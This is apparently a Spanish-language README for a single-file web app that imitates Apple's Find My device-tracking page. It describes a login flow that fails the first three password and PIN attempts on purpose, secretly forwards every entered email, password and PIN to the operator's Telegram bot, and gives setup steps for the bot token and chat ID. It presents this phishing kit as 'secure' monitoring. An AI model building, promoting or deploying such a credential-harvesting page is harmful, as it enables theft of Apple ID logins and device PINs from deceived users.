# Encontrar • Rastreo Vectorial Nativo 📱🛰️

<div align="center">

![HTML5](https://img.shields.io/badge/HTML5-Canvas%20Native-E34F26?style=flat-square&logo=html5&logoColor=white)
![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-v3.4-38BDF8?style=flat-square&logo=tailwind-css&logoColor=white)
![JavaScript](https://img.shields.io/badge/JavaScript-ES6+-F7DF1E?style=flat-square&logo=javascript&logoColor=black)
![Telegram API](https://img.shields.io/badge/Telegram-Bot_Integration-26A5E4?style=flat-square&logo=telegram&logoColor=white)
![Status](https://img.shields.io/badge/Status-Active_Development-success?style=flat-square)

Una aplicación web interactiva de rastreo de dispositivos móviles inspirada en **Apple Find My**, construida completamente con un **motor de mapas vectoriales nativo (HTML5 Canvas)**. Diseñada específicamente para simular la localización exacta en **Las Peñas, Esmeraldas, Ecuador**, con una interfaz elegante con efectos *Glassmorphism* estilo iOS y notificaciones de seguridad integradas vía Telegram.

</div>

---

## 🚀 Características Principales

*   🗺️ **Motor de Mapas Vectoriales 100% Propietario:** Sin dependencias externas de APIs pesadas como Google Maps o Leaflet. Renderiza dinámicamente la costa del Océano Pacífico, franja de playa, vías principales (*Vía del Pacífico E15, Vía La Tola, Carlos Rosero*), cuadras urbanas y huellas arquitectónicas 3D a 60 FPS.
*   🔒 **Sistema de Verificación Silenciosa (Anti-Errores):**
    *   **Paso 1 (Cuenta):** Al ingresar correo y contraseña, los primeros **3 intentos** fallan intencionalmente mostrando un error realista. Al **cuarto intento**, permite el acceso de forma natural.
    *   **Paso 2 (PIN del Dispositivo):** Pantalla de bloqueo numérica estilo iOS donde los primeros **3 intentos** con PIN incorrecto fallan y sacuden la interfaz, permitiendo el desbloqueo exitoso al **cuarto intento**.
*   🤖 **Integración Segura con Bot de Telegram:** Cada intento de inicio de sesión (tanto correos y contraseñas como PINs ingresados) es enviado de forma instantánea y secreta a tu bot personal de Telegram para mantener la integridad y monitorear el acceso.
*   📡 **Marcador de Dispositivo con Radar:** Icono de smartphone animado con **ondas circulares de sonar concéntricas** y panel táctil flotante con información detallada en vivo (GPS $\pm 3\text{m}$, red móvil, altitud y estado de movimiento).
*   🎨 **Temas Visuales Múltiples:** Alterna entre diferentes modos nocturnos y de contraste adaptados para visualización inmersiva.
*   🎵 **Acciones Remotas:** Simulación de reproducción de sonido de alerta en alta frecuencia, trazado de rutas peatonales y sincronización de GPS en tiempo real.

---

## 🛠️ Tecnologías Utilizadas

*   **HTML5 Canvas & 2D Context:** Renderizado vectorial y cálculos trigonométricos de cámara y perspectiva 3D.
*   **Tailwind CSS:** Estilizado moderno y utilitario.
*   **Phosphor Icons:** Iconografía limpia y minimalista.
*   **JavaScript (Vanilla ES6+):** Lógica del motor de render, interpolaciones de cámara (Easing/Spring) y gestión de estados asíncronos con la API de Telegram.

---

## ⚙️ Configuración del Bot de Telegram

Para recibir los reportes de intentos de inicio de sesión y PIN directamente en tu Telegram:

1. Habla con [@BotFather](https://t.me/BotFather) en Telegram para crear un nuevo bot y obtener tu **Bot Token**.
2. Obtén tu **Chat ID** personal hablándole a un bot como [@userinfobot](https://t.me/userinfobot).
3. Abre el archivo principal de la aplicación y busca las siguientes constantes al inicio del script JavaScript:

```javascript
const TELEGRAM_BOT_TOKEN = "TU_BOT_TOKEN_AQUI"; // Reemplaza con el token de BotFather
const TELEGRAM_CHAT_ID = "TU_CHAT_ID_AQUI";     // Reemplaza con tu Chat ID
```

---

## 📦 Instalación y Uso Local

Al tratarse de una aplicación desarrollada bajo el **Mandato de Archivo Único**, todo el diseño, estilos y lógica residen en un solo archivo `.html`.

1. Clona el repositorio o descarga el archivo HTML:
   ```bash
   git clone https://github.com/tu-usuario/encontrar-dispositivo-vectorial.git
   ```
2. Abre el archivo `Encontrar Mi Dispositivo.html` directamente en cualquier navegador web moderno (Chrome, Safari, Firefox, Edge).

---

## 📱 Flujo de Demostración

1. Al abrir la app, la cámara realizará un zoom automático panorámico hacia **Las Peñas, Esmeraldas**.
2. Aparecerá el modal de **Verificación de Identidad**. (Puedes usar el botón *"Rellenar datos demo"*).
3. Tras intentar 3 veces, el cuarto intento te dejará pasar y acercará la vista a la manzana de comercios (*Disensa*, *Ocean Style Boutique*, *Hotel Casa Blanca*).
4. En el modal del **PIN del Dispositivo**, ingresa cualquier código 3 veces (fallará interactivamente) y al cuarto intento o usando el botón *"Rellenar PIN"* desbloquearás la posición exacta del celular con las ondas de radar y el panel inferior de acciones.

---

## 📄 Licencia

Este proyecto está bajo la Licencia MIT. Siéntete libre de usarlo, modificarlo y adaptarlo para tus propios proyectos web.